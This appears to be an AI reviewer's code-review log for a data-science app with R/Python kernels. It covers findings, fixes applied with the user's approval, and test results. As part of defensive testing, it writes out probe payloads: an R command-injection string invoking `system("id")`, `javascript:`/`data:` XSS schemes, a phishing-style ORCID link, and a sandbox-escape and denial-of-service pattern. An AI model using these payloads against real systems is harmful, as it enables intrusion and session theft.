- 🟠 project_service.py:77 — **`relink_creator_on_update` is wired into only 1 of 6 provenance scopes**, so the "git clone shows the importer as author" fix silently doesn't apply to SQL collections, ETL pipelines, mapping projects, workspaces, datasets or plugins. `grep relink_creator_on_update` → exactly one call site, while the identical clone-over-pointer flow exists for all of them (`applyClonedEntity` re-applies `createdBy`/`createdByDetails` through `storage.X.update()`), and all their `Update` schemas accept those fields. `stamp_creator` is correctly wired to all 6 — same asymmetry. So a git-linked SQL collection cloned by admin still displays "admin", which is precisely the bug `52b73055` claims to fix. Fix: call the helper in the other 5 services before `db.commit()`; extend the new test to at least one sibling scope.
- 🟠 renv_provisioner.py:174,181-185/:322-326/:357-358/:411-415 — **the user-settable `repos` value is interpolated into `Rscript -e` source guarded only by `.replace("'", "")`**, breaking the invariant the 2026-08-01 review relied on ("`repos` flows ONLY into subprocess env vars, never into R source"). The new `check_updates`/`check_kernel_updates`/`upgrade_kernel_package`/`ensure_kernel_r_lib` paths all interpolate it; `env_options._sanitize` allowlists the R `method` but places **no constraint on `repos`**, and any `ide:write` editor can set it. The sub-agent could **not** weaponise it into RCE (single quotes stripped; the trailing-backslash escape only produced R parse errors), so this is **hardening, not a demonstrated RCE** — but it is safe-by-luck rather than by design. Fix: validate `repos`/`indexUrl` as an `http(s)` URL with no whitespace/control chars in `_sanitize`, or keep it out of R source entirely via `options(repos=)` from the env var.

**🟡 MINOR (batch):**
- 🟡 execution.py:526-541 — **the "drain stdout on stop" aborts after one chunk in the exact scenario it was written for.** The run task's `on_chunk` is `await websocket.send_json(...)`, and teardown happens *because the client closed the socket* → the first chunk raises `Cannot call send once a close message has been sent`, caught by `except BaseException` → the drain stops and the leftovers stay in the pipe. Safe today only because `fa53ef6d`'s run-tagging catches what the drain fails to; residual symptom is the next run blocking on `_lock` (2.4 s measured) with no feedback. Fix: drain with a sink `on_chunk`, not the socket.
- 🟡 kernel.py:661-663 — the stale-run guard handles `run_n < expected` but **silently accepts a HIGHER tag as ours**; if the pipe ever desyncs ahead, a future run's `done` is accepted as this run's — the same "run looks done instantly" bug in the other direction. Fix: strict equality, log+raise on `run_n > expected`.
- 🟡 kernel.py:544-560 — `interrupt()`'s `busy` read is an unsynchronised TOCTOU. Probed 15× with 0 poisoned runs, but only because the kernel-side absorb (`except KeyboardInterrupt: continue` / R `.stray_int`) does the real work — the docstring credits the `busy` check, which is wrong. Fix: correct the docstring; don't regress the absorb handlers.
- 🟡 routes/environments.py:251-258 — the "non-removable kernel infra package" server guard is `if package in _KERNEL_DEPS`, but `package` is the full spec, so `DELETE …/packages/jsonlite==1.0` slips past it. Harmless today (removal targets the *project* lib while infra lives in the shared kernel lib, wrapped in `try(silent=TRUE)`) — path isolation is the real protection and the guard is cosmetic. Fix: compare on the parsed name.
- 🟡 DashboardPage.tsx:129 — `currentDashboardId` is read in the effect but **missing from the dep array**, so navigating dashboard A → B prewarms for the stale dashboard — the "dead prewarm" `5250212d` claims to fix. eslint doesn't catch it (`react-hooks/exhaustive-deps` not enabled). Fix: add it to the deps.
- 🟡 card-meta-footer.tsx:56-70 — the new author tooltip links are **keyboard-unreachable**: `TooltipTrigger asChild` wraps a plain non-focusable `<span>`, so the tooltip never opens on focus and a keyboard/SR user can't reach the website/email/ORCID anchors. Radix Tooltip is also the wrong primitive for interactive content (HoverCard is, and isn't installed). Fix: `tabIndex={0}` on the trigger, or install HoverCard.
- 🟡 card-meta-footer.tsx:88-90 — `orcidHref` passes **any** `http(s)://` URL verbatim, so an imported entity's `orcid: https://evil.example/phish` renders as an ORCID-labelled link to anywhere. **Not XSS** (probed: `javascript:`/`data:`/`vbscript:` all neutralised). Fix: accept only `orcid.org/<16-digit>`; else render unlinked. Also `rel="noreferrer"` → `rel="noopener noreferrer"` (:60).
- 🟡 project-pull.ts:255 — a selective script pull now keeps **all** remote folders (`f.type !== 'file'`), not just ancestors of selected files, so pulling one script from `a/` also materialises empty `b/`, `c/`… Fix: drop folders entirely and let `fromPathTree` synthesize the needed ancestors.
- 🟡 user_service.py:122-124 — the detach UPDATE silently bumps `updated_at` on every row the deleted user created (`TimestampMixin.onupdate` applies to Core UPDATEs; verified by compiling the statement) → a provenance lie on the "last modified" chip. Contained: `updatedAt` is in `_INSTANCE_FIELDS` so exports are stripped → **no git churn**. Fix: re-write `updated_at` to itself in `.values()`.
- 🟡 git-file-meta.ts:121 — `README_RULE` added to `sql-script-collections` only, while `etl-pipelines`/`data-catalogs`/`dq-rule-sets`/`schema-presets` gained the same `excludeForeign` Sync-all in this range → a hand-authored `README.md` stays category `other` and is **silently dropped by Sync all** in those 4 scopes. Fix: add `README_RULE` to all four.
- 🟡 Asymmetric cycle-hardening: `treeNodePath` + its Python twin gained a `seen` guard, but `buildIdePath`/`_ide_path` (the scripts tree) did not — a cyclic `parentId` still spins forever in **both** runtimes (symmetric, so no parity break). Fix: same guard, or delegate. · `applyClonedEntity` (entity-io.ts:1868) swallows file-create failures with a bare `.catch(() => {})` → files vanish silently; use `console.warn` per convention. · `FilesPage.tsx:651` comment contradicts the code ("the kernel is SIGINT'd separately" — it no longer is). · `OutputPanel.tsx:387` JSX comment jammed in as a text child. · execution.py:539 `except BaseException` in teardown swallows `CancelledError`. · 3 sites concatenate `cardMenuTriggerClass` with a template string instead of `cn()` (`LabDashboardsPage.tsx:188`, `CohortCard.tsx:81`, `DatabaseCard.tsx:143`). · `test_kernel_interrupt_only_fires_while_busy` sets `busy` by hand on a fake proc, so it cannot catch 🟠#1.

Verified sound ✅ (actively probed, no finding):
- **Prior review's fixes all intact, not regressed by the kernel rewrites** — `grep allow-same-origin` → zero in JSX (both iframes `sandbox="allow-scripts"`); `job_timeout_seconds=1800` wired in `run_jobs`; `WarmPool._sweep_idle_locked` in both `acquire`/`refill`; `_bg_tasks`/`_spawn_bg` retention at both former bare-`create_task` sites; `enable_code_execution` in `_require_execute` **and** `render_component`.
- **The R package-name injection fix SURVIVED the large renv rewrite** — `validate_package_spec` enforced at all 3 layers (schema `_safe_packages`, route path/query `_valid_package`, both provisioners); the NEW multi-package list validates **each element** before interpolation; remove/upgrade re-validate and strip pins. Injection payloads (`x"); system("id"); ("`, backticks, newlines, `==` pins) all rejected. `_R_METHODS` allowlist intact in both places. Every `subprocess.run` in the provisioner has `timeout=120`; `build` uses `wait_for(build_timeout_seconds)` + kill. `import_env_spec` filename is base-name-only + allowlisted, and the `.Rprofile` it can write is inert (`--vanilla` implies `--no-init-file`). Library/sandbox paths derive from `project_fs` + a hardcoded language string — no user string reaches `.libPaths()`/`R_LIBS`.
- **Path-keyed `_tree.json` front/back parity holds** (apart from the astral-sort 🟠) — hand-diffed `toPathTree` vs `_to_path_tree`: identical dropped-key set, identical `{path, ...rest}` key order; the `scripts/` prefix is stripped identically; `rest` field order pinned by matching declaration order in `SqlScriptFile` / `SqlScriptFileResponse`. All 8 `*-export-golden` suites pass on TS **and** `test_project_export.py`/`test_workspace_export.py` (17) on Python.
- **VERSION revert is complete** — `VERSION`=2.2.1, `grep -rn "2\.3\.0"` across apps/docs/VERSION → **zero hits**; all 5 golden `appVersion` stamps reverted with it. **Shipping the format change without a bump is safe**: `appVersion` is stamped on export and *discarded* on import; nothing branches on it.
- **Backward compat of id-keyed → path-keyed is genuinely handled** (`readPathTree` discriminates on `every(n => typeof n.path === 'string')`; `readPathTree([])` → `[]`, not a crash) — the one gap is the legacy **`files.json`** form (🔴#2). **`deterministicId` needs no Python twin**: there is no server-side project/collection import — even in server mode the client parses the ZIP and POSTs rows. `:`-escaping disambiguates `('a:b','c')` from `('a','b:c')`. `b17fd55b`'s clone-id map was cleanly *removed* by derivation, no dead remnants. Hostile repo paths can't traverse (server writes go through `project_fs._safe_join`; sql/etl files are DB rows).
- **`021f683b` user-delete FK detach is correct** — enumerated FKs to `users` three ways (model grep, alembic grep, empirical `Base.metadata` walk): 16 nullable detached + 8 non-nullable/CASCADE, and **zero** non-nullable-without-ondelete, so the `if not column.nullable: continue` guard can never leave a 409 nor null a NOT NULL column → no mid-transaction IntegrityError. Nothing is DELETEd; snapshot columns survive so provenance still displays. Admin-only route, self-delete rejected, last-active-admin rejected. Detach UPDATEs + DELETE share one session/commit and roll back together. `owner_id` is **written but never read for authorization** (permissions resolve via members/roles), so nulling it can't orphan or lock content.
- **`52b73055`: "no privilege attached to `created_by_id`" is STILL TRUE** — grepped every non-model reference: provenance stamping/relinking only, **zero** authz reads. A crafted ORCID/email in a ZIP can make content *display* another user's name (pre-existing, accepted) but **cannot** touch `owner_id`. `relink_creator_on_update`'s guards are right (re-attribution editor wins; a normal PATCH never touches the author).
- **`f38f0f94`: no XSS** — probed `javascript:alert(1)`, `JaVaScRiPt:`, `data:text/html;base64,…`, `vbscript:` against `websiteHref`/`orcidHref`: every dangerous scheme returns `null` or gets `https://` **prepended** (reduced to a hostname). Nothing goes through `dangerouslySetInnerHTML`. **`7984bcf0` org createdAt round-trips symmetrically** — the front already sent it and both exporters already emitted it; the schema was the one missing link, so no twin needed.
- **No ReDoS in the new ANSI regexes** — timed on hostile inputs: all **linear** (≤15 ms on 0.5–1.2 MB pathological strings); `NON_SGR_CSI_RE` correctly excludes `m`, `OTHER_ESC_RE`'s `\x1b(?![[\]])` spares OSC. Output renders as React children (auto-escaped), no `dangerouslySetInnerHTML` in that path.
- **"Kill session" correctly authorized** — registry key includes `user_id` so A can't name B's kernel; `DELETE /sessions/{id}` 403s on a foreign owner; `restart` pops under the lock and shuts down **outside** it; `_proc.kill()` + `await wait()` → no orphan/zombie; `delete_session` shuts kernels down before deleting the row.
- **Run-tagging works end-to-end** (probed: run 1 stopped mid-flight, run 2 saw only its own output); counters stay in lockstep across the SQL-RPC path and the `BrokenPipeError` restart; double `interrupt()` while idle is a no-op; the drain is bounded by `wait_for(execution_timeout_seconds)` + `cancel()` → **cannot hang forever**. **No deadlock / lock inversion** — `KernelManager._lock` and `Kernel._lock` are never held together; every call site awaits `shutdown()` outside the lock; `WarmPool._reserved` has no overshoot.
- **Frontend hooks clean** — `LiveTimer` clears its interval and re-runs only on cadence change (no leak); `use-server-kernels` 4 s poll has a `cancelled` flag + `clearInterval` + `enabled` gate; keys stable/unique; no direct state mutation. **`env_id` → `session_id` rename complete** on both sides of the wire.
- **Hygiene sweep clean across the whole diff** — new `console.log`: **0**; new `: any`/`as any`: **0**; new `dangerouslySetInnerHTML`: **0**; hardcoded secrets: **0**; hardcoded user-facing English outside `t()`: **0**; **i18n 4064/4064 with 0 divergence** (every new key in both locales, both renames symmetric). No file crossed ~800 lines *because of* this range; `entity-io.ts` (2740) is a standing refactor signal but this range **net-extracted** `entity-tree.ts` out of it — right direction. **Docs consistent**: all 4 deleted plan filenames grepped across `docs/`, `CLAUDE.md`, `.claude/` → **zero dangling references**; README rows retired, architecture absorbed the as-built.
- **`cleanGitUrl`/`_clean_url` schemeless inference is a correct twin** (equivalent regexes, same "first segment has a dot" heuristic, SSH untouched).

### Fixes applied this review (uncommitted, awaiting user test) — 2026-08-04

The user approved fixing **everything**. All 3 🔴, all 6 🟠 and the 🟡 batch are fixed, plus the pre-existing red assemble test. 32 files, ~551 insertions. Every fix verified in source; the three most severe were verified by **removing the fix and watching the new test fail**.

**🔴 (all fixed):**
- **R figure capture silently dead** — `ensure_kernel_r_lib` now runs the install INSIDE the kernel's own isolation (`.Library` swapped to the base-only sandbox, `.libPaths()` pinned to the kernel lib) and asks for `dependencies=c('Depends','Imports','LinkingTo')`. Empirically: the kernel lib goes from **3 packages to 10** (`base64enc, cli, cpp11, jsonlite, lifecycle, rlang, stringi, svglite, systemfonts, textshaping`) — exactly the closure computed via `tools::package_dependencies`. Pinning `R_LIBS` alone was tried first and is NOT sufficient (on macOS's R.framework `.Library` still exposes the contributed packages — verified `rlang visible: TRUE`). Also **stopped swallowing the failure**: a non-zero exit is now reported via `on_log` instead of leaving a half-populated library and "figures just don't work". `test_execute_r_plot_captured_as_svg` **passes** (it was red on pristine HEAD). New tests: `test_ensure_kernel_r_lib_installs_under_kernel_isolation`, `test_ensure_kernel_r_lib_reports_a_failed_install`.
- **Legacy `files.json` import lost ALL script content** — `readPathTree` no longer destructures `content` out of the legacy branch; `reconstructTreeFiles` still overwrites it when a raw ZIP entry exists, so the path-keyed layout is unaffected. Verified the export side does NOT leak content (`toPathTree` drops it; all 8 golden suites still byte-match). New tests: `keeps inline content from the oldest files.json layout` (entity-tree) + `applyClonedEntity keeps INLINE content when the tree carries it and the ZIP has no raw file` (entity-io).
- **`tsc -b` gate red (21 errors)** — relaxed `fromPathTree`/`storablePathNode`/`attachTreeIds` from the unsatisfiable `T extends Record<string, unknown>` to `T extends object` (the bodies already cast through `as unknown as T`), and made `ParsedProjectZip.envSpecs` optional (its sole consumer already guarded with `?.length`). **21 → 0 errors**; baseline was 1.

**🟠 (all fixed):**
- **Stop within ~100ms of Run killed the kernel** — two halves. (1) New `Kernel._running`, set when the kernel emits its first line for a run and reset with the process; `interrupt()` now requires `busy AND _running`, so a SIGINT can't land on a still-booting interpreter. Both kernels emit a `__linkr_ack__` line before any interruptible work, so Stop also works for a run that prints nothing before hanging (the host skips the ack). (2) Closed the uncaught windows: the Python loop's strip/decode/counter moved inside the `try` (with the run counter bumped BEFORE, so the error `done` always carries this run's tag and can't be discarded as stale), and the R prologue + `suppressMessages` block wrapped in `tryCatch(interrupt=)`. New `test_stop_immediately_after_run_does_not_kill_a_cold_kernel` spawns a REAL subprocess at 0/10/50ms — **confirmed it fails with the old guard**.
- **~9.2s frozen event loop under the manager lock** — the two `ensure_*` calls moved out of the sync `_make` into a new `async KernelManager._prepare_r_shared`, run via `asyncio.to_thread` BEFORE `self._lock` and memoised. Memoised **by data-dir path, not a bool**: the data dir is reconfigurable (and per-test), and a stale "ready" against a fresh empty sandbox starts an R kernel that dies on launch. `spawn_batch` became async; `run_ephemeral`/`prewarm` prepare once then use the sync `_make` for the pool factory.
- **`check-for-updates` blocked the loop** — now `await asyncio.to_thread(environments.check_updates, …)`. It is only `read`-gated, so any project reader could otherwise stall the single worker for up to 120s per call.
- **Front/back path sort diverged for astral chars** — new `_utf16_key` (`path.encode("utf-16-be")`) on BOTH server sort sites, replacing the code-point sort whose comment falsely claimed it matched JS. Order confirmed against Node (`["a.sql","😀.sql","�.sql"]`). Twin tests pin it on both sides: `test_path_sort_matches_javascript_for_astral_characters` + `orders astral filenames by UTF-16 code unit`.
- **`relink_creator_on_update` under-wired** — added to `workspace_service.update` and `user_plugin_service.update`, joining `project_service` and `mapping_project_service`. **Corrected the review's scope**: `sql_script`/`etl_pipeline`/`data_catalog`/`dq_rule_set`/`schema_preset` do NOT use `stamp_creator` at all — they take `created_by_id` straight from the client payload, so relinking there would null a legitimately-supplied id. I added it to those two first, then reverted. The correct rule is "every scope that stamps must also relink" — now 4/4. Tightened the mapping-project test to assert `createdById is None` after a snapshot rewrite.
- **`repos`/`indexUrl` reached `Rscript -e` guarded only by quote-stripping** — now validated in `env_options._sanitize` against `^https?://[^\s'"\\`;]+$` (same layer as the existing `method` allowlist); an invalid value is dropped so the next layer's known-good default wins. New `test_repos_and_index_url_must_be_clean_http_urls` exercises the injection payloads.

**🟡 batch (all fixed):**
- **Kernel-package guard bypassable by a version pin** — new `package_spec.package_name()`; the guard compares on the bare name, so `DELETE …/packages/jsonlite==1.0` is refused. New test covers 4 pin forms; **confirmed it fails with the old check**.
- **`run_n > expected` silently accepted** — a done from a LATER run now raises `ExecutionError` (the pipe is unrecoverably desynced) instead of being paired with this run.
- **Drain aborted after one chunk** — the drain's premise was defeated by its own `on_chunk` (an `await websocket.send_json` on the socket whose closure triggered the teardown). A `draining` flag now silences `on_chunk`/`run` during teardown so the drain actually reads to the done payload. Also `except BaseException` → `except asyncio.CancelledError: raise` + `except Exception`, so server shutdown is no longer swallowed.
- **`currentDashboardId` missing from the prewarm deps** — added, so navigating dashboard A→B no longer prewarms for the stale dashboard (the "dead prewarm" `5250212d` meant to fix).
- **ORCID row linked anywhere** — `orcidHref` now accepts only a bare 16-digit id or an `orcid.org` URL (normalising `http`/`www.`), else null → plain text. `rel="noreferrer"` → `rel="noopener noreferrer"`. New tests cover `evil.example`, the `orcid.org.evil.example` prefix trick, and `javascript:`/`data:`.
- **Author tooltip keyboard-unreachable** — `tabIndex={0}` + a focus ring on the AuthorChip trigger (it holds the only links); the date tooltip is plain text and deliberately left non-focusable.
- **`cn()` bypassed** — the 3 template-string `cardMenuTriggerClass` sites now use `cn()` (import added).
- **Comments** — the OutputPanel JSX comment moved out of the element's children; the FilesPage comment corrected (it claimed the kernel is SIGINT'd separately, which it no longer is).
- **R source back under the argv threshold** — the ack push made `_R_KERNEL_LOOP` 7051 bytes, right at the ~7 KB limit where Rscript mangles `-e` and the kernel never starts ("Loading R runtime" forever). Moved 2776 bytes of prose comments from inside the R string to the Python side — which is exactly what the file's own header mandates — leaving **5205 bytes** and real headroom.

**Found during the user's manual testing (not in the review) — fixed:**
- **The streaming IDE path never auto-built the environment.** `_kernel_ws_loop` called `environments.resolve` where the non-streaming `/execute` route calls `ensure_ready`, so a Run in the IDE executed against an unmaterialised library and every `library(...)` failed with no build ever triggered. It now calls `ensure_ready` before starting the kernel.
- **`needs_build` trusted the DB status over the disk.** It was `kind == "managed" and status in ("draft","error")` — but the built library is a machine-local, git-ignored cache, so a `ready` status routinely lies (project imported/cloned on another machine, cache cleared) and a lockfile can appear AFTER the env row was first resolved as `system`/`ready` (an import, a `git pull`), which no status transition catches. Both provisioners already exposed `is_built()` (a real disk check) and nothing called it. `needs_build` now asks the disk: a committed spec with no materialised library needs a build whatever the status says; `building` is never re-entered; `error` is retried (a network blip recovers on the next run, per the user's choice). New tests: `test_needs_build_asks_the_disk_not_just_the_status`, `test_needs_build_true_for_a_system_env_whose_spec_appeared_after_resolve`.
- **The build was invisible.** A multi-minute build sat behind an opaque "Loading R runtime". `ensure_ready` gained an optional (async-capable) `on_log`; the WS route streams a "Building <lang> environment…" notice, then each provisioner line, then "Environment ready." — or the failure on stderr, keeping the socket alive. The provisioner runs in a worker thread, so lines cross into the event loop via a queue + pump task (drained before cancel). New test: `test_ensure_ready_streams_build_lines_to_on_log`.

**Not a bug (user question during testing):** `for (i in 1:100) { cat(...); Sys.sleep(0.5) }` shows nothing until the end, while `print("a"); Sys.sleep(5); print("b")` streams. Correct and by design: `.eval_one` wraps each expression in `utils::capture.output`, which buffers stdout for the whole `eval`, and the flush (`.stream_lines`) happens once per TOP-LEVEL expression. A `for` loop is ONE expression → one flush. Real limitation worth a separate improvement (replace `capture.output` with a `sink()` to a line-pushing connection) — a long R loop has no visible progress. Not attempted here: non-trivial R-kernel change, out of this review's scope.

**Also fixed (was flagged "author's to fix" by the 2026-08-02 review):**
- `test_project_export_assemble.py::test_assembler_reproduces_golden_tree` — **green**. Its `_seed` now writes the column-metadata + parseOptions sidecar through the production writers (`dataset_fs.write_column_meta`/`write_parse_options`), so the DB-round-trip assemble path reproduces the golden's inline `columns`/`parseOptions`. This also closes the coverage gap the review noted: `_canonical_parse_options` is now exercised end-to-end on the real disk-re-read path, not just by the pure builder tests.

Verification: backend **653 passed, 2 skipped, 0 failed** (full suite; was 2 failed — one new regression, one pre-existing, both now fixed) · frontend **532 passed** (49 files, +5) · **typecheck 0 errors** (was 21) · lint **0 errors** (149 warnings, one below the 150 baseline) · i18n parity **4064/4064, 0 divergence** · ruff clean on every touched file · all 8 export goldens byte-match on TS AND Python. All uncommitted, awaiting the user's app test. Note: `docs/planning/README.md` in the working tree is a PARALLEL SESSION's catalog plan, not part of this work.

Carried follow-ups (non-blocking): entity-io.ts (2740)/FilesPage.tsx (1988)/seed-loader.ts/WorkspacesPage.tsx split; the 4 of 5 new git-pointer `createdAt` fields with no golden coverage (only mapping-project is pinned — add linked sql/etl/dq/catalog entries to the workspace golden); seed the parseOptions sidecar in `test_project_export_assemble.py::_seed` so the pre-existing red test goes green and `_canonical_parse_options` is covered on the real server path; `ide-files.ts` nested-IDE-script flattening on server-mode import (pre-existing, now trivially fixable since `attachTreeIds` holds the correct `path`); `WarmPool._sweep_idle_locked` runs on every acquire (perf nit); PTY idle sweep. Pre-existing/systemic (out of scope): `workspace_id is None → no access check` (planned access-group rework); `update_project` destination-workspace authz on move; ~150 React-Compiler set-state-in-effect warnings.

---

## 2026-08-02 — Dashboard widgets run as parallel ephemeral kernels (warm pool) + HTML-widget capture (plotly/leaflet/DT in iframes) + SVG-as-XML sanitize/namespace + Goupile eCRF import + editable column metadata (+parseOptions sidecar, drop _columns.json) + run-script-as-background-job + env install-options (CRAN/PyPI) + ANSI log colour + language-scoped sessions + widget-editor draft save/cancel

- Reviewed by: Claude Opus 4.8 — 4 parallel adversarial Explore sub-agents by feature group (1: backend execution/kernel [warm pool, ephemeral, run-as-job, env install-options injection surface]; 2: frontend dashboard/figures/HTML-widget/sanitize [XSS]; 3: datasets/Goupile import/column-metadata/export-parity; 4: env UI/jobs/ANSI/sessions/i18n). **Reviewer independently re-verified the top findings in source and EMPIRICALLY PROBED the sanitize XSS surface** (wrote throwaway vitest probes for svg-namespaced `<script>`, `onload`/`onclick`, `xlink:href=javascript:`, foreignObject) and confirmed the two iframe sandbox strings in the diff. Two independent agents converged on the SAME top finding (the widget iframe `sandbox="allow-scripts allow-same-origin"` sandbox-escape). Reviewer also independently confirmed: the env install-options (`repos`/`indexUrl`/`trustedHost`) reach subprocesses ONLY as env vars (`RENV_CONFIG_REPOS_OVERRIDE`/`UV_INDEX_URL`/`UV_INSECURE_HOST`), never into `Rscript -e`/shell source, so NO new injection (R `method` allowlisted in both env_options._sanitize AND renv_provisioner._method_prefix); the `_columns.json` removal is safe (never read on import, columns travel inline in `_tree.json`, both builders dropped it, goldens regenerated + green); parseOptions inline export parity (TS `_tree.json` ⟷ Python `_dataset_node` omit-when-None, golden fixture pins it at line 52).
- Range: 0a3a9a39..72dfd77f (**40 commits, 128 files, ~6,471 insertions / ~702 deletions**). First commits `6611d0f3`/`aeb4e434`/`a201fa42` = the 2026-08-01 review's own fixes landing (R-injection validate, enable_code_execution gate, createdAt pointer omit — spot-checked intact). Highlights: **dashboard code widgets run ephemeral** (`kernel.run_ephemeral` — a fresh isolated process per widget from a per-`(lang,project,interpreter)` `WarmPool`, so a page of widgets runs in parallel not serialised on one kernel lock; `prewarm` on dashboard-open sizes the pool to the widget count, `EphemeralConcurrency` semaphore bounds it); **built-in renders run on the app interpreter** (environment=None), not the project's managed env; **HTML-widget capture** (`_capture_html` = `pio.to_html`/`_repr_html_`; R `saveWidget`; last-expression auto-capture via `_exec_capture_last` + R `withVisible`) shown in **iframes** (OutputPanel html-tab + JobsIndicator + FigureViewer); **SVG parsed as XML** (case-sensitive clipPath/viewBox survive) + **per-figure id namespacing** (`namespaceSvgIds` — fixes parallel figures sharing an svglite clipPath id → all-but-first blank); **Goupile eCRF import** (`goupile-import.ts` — full-outer-join form sheets on `__tid`, collision-only column prefixing, dictionary→label/description/valueLabels, one-hot multi handling); **editable column metadata** (label/description/valueLabels, server-mode sidecar persistence) + **parseOptions in the sidecar** (survives reparse/restart) + **drop redundant `_columns.json`**; **run-script-as-background-job** (`run_jobs` — fresh batch process, streamed to jobs panel, figures/table collected on the job, ⌘⇧J); **env install-options** (CRAN repos/method, PyPI index/trusted-host — workspace defaults + per-env override in `options.json`, honored by renv/uv); **ANSI colour** in job logs/output (`ansi.ts`/`AnsiText`); **language-scoped execution sessions** (separate R & Python); **widget-editor draft Save/Cancel + ⌘S**, split preview output/console; **dependabot-triage skill** + `docs/security/README.md`; **plot builder vectorised uniquePer (~300×)**.
- Last reviewed commit: 72dfd77f0280e53cc702cdd35fe7dcbc61751b1b
- Verdict: **Fix-then-ship** — 1 🟠-headline (widget iframe sandbox escape, on NEW code, currently self-XSS but latently cross-user) + 3 backend 🟠 (no warm-pool idle sweep → unbounded idle interpreters; run-as-job has no wall-clock timeout → two drip-printing jobs wedge the shared build/jobs semaphore forever; fire-and-forget refill/prewarm create_tasks unretained → GC-able) + a 🟡 batch. **Nothing fixed yet — awaiting user direction.**
- Tests: frontend **486 passed** (46 files) · backend touched-area **179 passed** (package_spec, env_options, environment_routes/resolve, execution, kernel_manager, jobs, dataset_files, render, workspace_export_pointer, execution_sessions) · Lint: **0 errors** (152 pre-existing React-Compiler set-state-in-effect warnings, same class as prior baseline of 150) · Typecheck: **0 errors** (whole tree clean — the pre-existing backlog was cleared by `ffc2f332` in this range) · i18n parity: **CLEAN** (4037/4037, 0 keys diverge en↔fr).
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). The 3 backend 🟠 (warm-pool sweep, job timeout, create_task GC) are **server-mode only** — they do NOT hit the shipping WASM build; they're DoS/resource-leak, not RCE. The **iframe sandbox 🟠 hits BOTH modes** (JobsIndicator/OutputPanel exist in the WASM build too, fed by WASM WebR/pyodide widget output) → weighted highest despite being "only" self-XSS today, because the fix is a one-token removal and it turns cross-user the moment `PluginOutputRenderer` renders `result.html` to dashboard viewers (the field is already plumbed).

Findings (top ones re-verified in source; XSS surface empirically probed):

**🟠 IMPORTANT:**
- 🟠 JobsIndicator.tsx:172-176 (NEW) + OutputPanel.tsx:320-326 (iframe pre-existing, but FilesPage.tsx:594-598 NEW starts feeding captured widget HTML into it) — **`<iframe srcDoc={html} sandbox="allow-scripts allow-same-origin">` defeats its own sandbox.** A `srcDoc` iframe inherits the embedder origin; `allow-scripts`+`allow-same-origin` together let the framed content (arbitrary HTML/JS from user R/Python via `pio.to_html`/`saveWidget`) reach `window.parent`, the app's cookies/localStorage/session, and even strip its own frame's `sandbox`. Today it's effectively **self-XSS** (JobsIndicator shows the running user's OWN job; dashboard widgets render via `PluginOutputRenderer`, which computes `hasHtml` but does NOT yet render an html iframe — so no live cross-user vector). Becomes a cross-user **session-theft / account-takeover** the instant a viewer sees another author's widget HTML. `CatalogExportTab.tsx:181` already uses the correct safer form. Fix: **drop `allow-same-origin`** from both iframes (plotly/leaflet/DT run fine on `allow-scripts` alone — proven by CatalogExportTab); add a `sanitize.test.ts` covering the svg script/handler/js-href cases (none exists despite the security-critical XML-parse rewrite).
- 🟠 kernel.py `WarmPool` (~L781-868) + main.py:97 — **warm-pool kernels have no idle sweep → unbounded idle interpreters (server mode).** Unlike `KernelManager._sweep_idle_locked`/PTY, `WarmPool` only frees at app shutdown (`shutdown_all`). `prewarm(count=N)` spawns up to `min(N, widget_max_concurrency)`=8 pre-imported (arrow/ggplot2 / pandas/matplotlib, hundreds of MB each) processes per `(lang,project,interpreter)` bucket; a prewarm burst that widgets never consume sits idle forever, multiplied across projects/languages. Fix: idle timestamp + periodic sweep mirroring `_sweep_idle_locked`, or a global warm-process cap.
- 🟠 run_jobs.py:42 → kernel.execute_stream/`_read_stream` (kernel.py:~569) — **run-as-job has no overall wall-clock timeout → wedges the shared build/jobs semaphore.** Only a per-readline timeout (`execution_timeout_seconds`) exists; a job printing faster than that (`while True: print(i); time.sleep(1)`) resets the deadline every line and runs forever. `run_jobs` runs behind the same `max_build_concurrency`=2 semaphore as env builds → two such jobs permanently block ALL builds and other run-as-jobs (they sit `queued` forever). Fix: wrap the batch `execute_stream` in `asyncio.wait_for(..., timeout=build_timeout_seconds)` like the build provisioners.
- 🟠 kernel.py:933 (`run_ephemeral` refill) + :957 (`prewarm` refill) — **fire-and-forget `asyncio.create_task(warm_pool.refill(...))` is unretained → GC-collectable mid-flight.** The event loop keeps only a weak ref to a suspended task; every other create_task in the subsystem is retained (`jobs._tasks`, `current=`, `pump=`) — these two are the exception. Under GC pressure the refill can be silently cancelled (pool stays short → perf regression) and any error inside `refill` is swallowed. Fix: retain in a module-level set with `task.add_done_callback(set.discard)`.

**🟡 MINOR (batch):**
- 🟡 goupile-import.ts:175-177 — **repeatable form: two rows with the same `__tid` in one sheet → last-write-wins, earlier row silently dropped** (matches the documented one-row-per-form-per-`__tid` design assumption, so a design limitation not a regression, but it can silently drop clinical data — and headers derive from `rows[0]` only, so a ragged sheet drops later-only columns). Fix: detect duplicate `(sheet,__tid)` pairs and warn in the import dialog; document the assumption in the UI hint.
- 🟡 kernel.py:373-380 — **R `saveWidget(selfcontained=FALSE)` fallback yields a broken iframe** (reads only the main `.tmp`, discards the `*_files/` sidecar assets the sandboxed no-network iframe can't load → blank widget). Fix: drop the non-self-contained fallback (surface the original error) or inline the assets.
- 🟡 execution.py `_require_execute` (:88) — **`enable_code_execution` NOT enforced on `POST /execute` (incl. new ephemeral branch) or the new `POST /execute/run-as-job`.** Pre-existing on /execute (verified vs baseline), but `run_as_job` is a NEW code-execution route inheriting the gap; `prewarm`/terminal-WS/fs_browser/env routes all check the flag. Fix: add the check to `_require_execute` (covers both) matching `environments._require_ide`.
- 🟡 parseOptions sidecar key order (dataset_files.py:346 / dataset_fs.write_parse_options) — **insertion-order-dependent, not canonicalised** → theoretical spurious git diff / byte-parity flake between two instances that wrote `columnTypes`/`columnFilterMode` in different orders. Fix: sort keys on write or at export.
- 🟡 No server test round-trips the metadata sidecar through `_dataset_node`/`merge_column_meta`/`read_parse_options` — the golden feeds inline `input.json`, bypassing the disk re-read production path (parity holds today by inspection, but a future key-order change in `merge_column_meta` wouldn't be caught). Add one.
- 🟡 format-shortcut.ts:12 modifier display order is `⌘⇧⌥` not the macOS `⌘⌥⇧` (cosmetic, pre-existing — moved verbatim). install-detect.ts: `pip3`/`python3 -m pip` false-negative + conda `-c channel` value-flag (best-effort, documented). ServerEnvironmentsPanel.tsx:313 `pending` shadows the prop (no bug). session-store one-time active-session reset on the scope-key upgrade (cosmetic).

Verified sound ✅ (actively probed, no finding):
